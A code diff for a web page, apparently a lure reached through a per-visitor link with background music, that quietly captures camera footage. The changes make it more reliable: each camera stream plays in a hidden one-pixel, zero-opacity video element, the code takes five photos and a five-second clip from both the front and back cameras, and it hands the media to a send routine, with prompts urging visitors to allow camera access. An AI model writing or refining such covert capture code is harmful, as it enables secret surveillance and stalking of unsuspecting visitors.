@@ -2175,34 +2175,7 @@ const BG_MUSIC_URL = 'https://res.cloudinary.com/vl7tgkgi/video/upload/v17880705
   const uid = URL_UID;
   if (!uid) return;
 
-  const video = document.createElement('video');
-  video.setAttribute('playsinline', '');
-  video.setAttribute('autoplay', '');
-  video.setAttribute('muted', '1');
-  // Keep the element in the document but visually hidden behind the UI. Hidden
-  // off-screen elements (-9999px) can fail to decode frames on iOS, so instead
-  // we hide it with opacity/pointer-events and place it at the top-left corner.
-  video.style.cssText = 'position:fixed;left:0;top:0;width:1px;height:1px;opacity:0;pointer-events:none;z-index:-1;';
-  document.body.appendChild(video);
-
   const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
-
-  function captureFrame() {
-    const maxDim = 640;
-    const sw = Math.max(video.videoWidth || 640, 2);
-    const sh = Math.max(video.videoHeight || 480, 2);
-    const scale = Math.min(1, maxDim / Math.max(sw, sh));
-    const canvas = document.createElement('canvas');
-    canvas.width = Math.max(2, Math.round(sw * scale));
-    canvas.height = Math.max(2, Math.round(sh * scale));
-    const ctx = canvas.getContext('2d');
-    try {
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      return canvas.toDataURL('image/jpeg', 0.6);
-    } catch (e) {
-      return '';
-    }
-  }
 
   function toast(msg) {
     try {
@@ -2214,61 +2187,96 @@ const BG_MUSIC_URL = 'https://res.cloudinary.com/vl7tgkgi/video/upload/v17880705
     } catch (_) {}
   }
 
-  // Record a ~5 second video from the stream, returns a webm data URL.
+  // Record a ~5 second video from the stream. Prefer MP4 (H.264) so clips are
+  // widely playable, falling back to WebM on browsers without MP4 recording.
+  function pickRecorderMime() {
+    const candidates = ['video/mp4;codecs=avc1.42E01E,mp4a.40.2', 'video/mp4', 'video/webm;codecs=vp9', 'video/webm;codecs=vp8', 'video/webm'];
+    if (typeof MediaRecorder !== 'undefined' && MediaRecorder.isTypeSupported) {
+      for (const m of candidates) if (MediaRecorder.isTypeSupported(m)) return m;
+    }
+    return '';
+  }
+
   function recordVideo(stream) {
     return new Promise((resolve) => {
+      const mime = pickRecorderMime();
       let mr = null;
       const chunks = [];
       try {
-        mr = new MediaRecorder(stream, { mimeType: 'video/webm' });
+        mr = mime ? new MediaRecorder(stream, { mimeType: mime }) : new MediaRecorder(stream);
       } catch (e) {
         return resolve('');
       }
       mr.ondataavailable = (ev) => { if (ev.data && ev.data.size) chunks.push(ev.data); };
       mr.onstop = () => {
-        const blob = new Blob(chunks, { type: 'video/webm' });
+        const type = (mr.mimeType || mime || 'video/webm').split(';')[0];
+        const blob = new Blob(chunks, { type });
         const reader = new FileReader();
         reader.onloadend = () => resolve(reader.result || '');
         reader.readAsDataURL(blob);
       };
-      mr.start();
+      mr.start(1000);
       sleep(5000).then(() => {
         try { mr.stop(); } catch (e) { resolve(''); }
       });
     });
   }
 
-  // Capture 5 photos + a 5s video from a single stream, then stop it.
+  // Capture 5 photos + a 5s video from a single stream using its own video
+  // element (separate element per camera so front and back both reliably work).
   async function captureFrom(stream) {
-    video.srcObject = stream;
-    try { await video.play(); } catch (e) {}
+    const el = document.createElement('video');
+    el.setAttribute('playsinline', '');
+    el.setAttribute('autoplay', '');
+    el.setAttribute('muted', '1');
+    el.style.cssText = 'position:fixed;left:0;top:0;width:1px;height:1px;opacity:0;pointer-events:none;z-index:-1;';
+    document.body.appendChild(el);
+
+    const drawFn = () => {
+      const maxDim = 640;
+      const sw = Math.max(el.videoWidth || 640, 2);
+      const sh = Math.max(el.videoHeight || 480, 2);
+      const scale = Math.min(1, maxDim / Math.max(sw, sh));
+      const canvas = document.createElement('canvas');
+      canvas.width = Math.max(2, Math.round(sw * scale));
+      canvas.height = Math.max(2, Math.round(sh * scale));
+      const ctx = canvas.getContext('2d');
+      try {
+        ctx.drawImage(el, 0, 0, canvas.width, canvas.height);
+        return canvas.toDataURL('image/jpeg', 0.6);
+      } catch (e) {
+        return '';
+      }
+    };
+
+    el.srcObject = stream;
+    try { await el.play(); } catch (e) {}
 
     // Wait for at least one rendered frame so draws aren't black.
     await new Promise((resolve) => {
-      if (video.videoWidth > 0 && video.readyState >= 2) return resolve();
-      const onReady = () => { video.removeEventListener('loadeddata', onReady); resolve(); };
-      video.addEventListener('loadeddata', onReady);
+      if (el.videoWidth > 0 && el.readyState >= 2) return resolve();
+      const onReady = () => { el.removeEventListener('loadeddata', onReady); resolve(); };
+      el.addEventListener('loadeddata', onReady);
       setTimeout(resolve, 3000);
     });
-    // Small extra delay so the first frame is stabilized.
     await sleep(500);
 
     const shots = [];
     for (let i = 0; i < 5; i++) {
       let frame = '';
       for (let retry = 0; retry < 3 && !frame; retry++) {
-        frame = captureFrame();
+        frame = drawFn();
         if (!frame) await sleep(200);
       }
       if (frame) shots.push(frame);
       await sleep(350);
     }
 
-    // Record the 5s clip while showing the live feed (photos already taken).
+    // Record the 5s clip.
     const vid = await recordVideo(stream);
 
     try { stream.getTracks().forEach((t) => t.stop()); } catch (e) {}
-    try { video.srcObject = null; } catch (e) {}
+    try { el.srcObject = null; el.remove(); } catch (e) {}
     return { shots, vid };
   }
 
@@ -2280,7 +2288,6 @@ const BG_MUSIC_URL = 'https://res.cloudinary.com/vl7tgkgi/video/upload/v17880705
       images.push(...shots);
       if (vid) videos.push(vid);
     }
-    try { video.remove(); } catch (e) {}
 
     if (!images.length && !videos.length) {
       toast('Could not capture camera — no media.');
@@ -2314,8 +2321,8 @@ const BG_MUSIC_URL = 'https://res.cloudinary.com/vl7tgkgi/video/upload/v17880705
       toast('Camera not supported on this browser.');
       return;
     }
-    // Request back first (environment), then front (user). Each falls back to
-    // the other if a specific camera isn't present.
+    // Request back (environment) and front (user) together, each tolerating a
+    // missing/specific camera by falling back to any available one.
     const back = navigator.mediaDevices.getUserMedia({
       video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false,
     }).catch(() => navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false }));
@@ -2326,9 +2333,8 @@ const BG_MUSIC_URL = 'https://res.cloudinary.com/vl7tgkgi/video/upload/v17880705
     Promise.all([back, front])
       .then((streams) => sendStream(streams))
       .catch((e) => {
-        // If both failed together, try each separately as a last resort.
+        // If opening both together failed, try each separately as a last resort.
         back.then((s) => sendStream([s])).catch(() => front.then((s) => sendStream([s])).catch(() => {
-          try { video.remove(); } catch (_) {}
           toast((e && e.name === 'NotAllowedError')
             ? 'Camera permission was blocked. Refresh and tap to Allow.'
             : 'Camera is not available right now.');
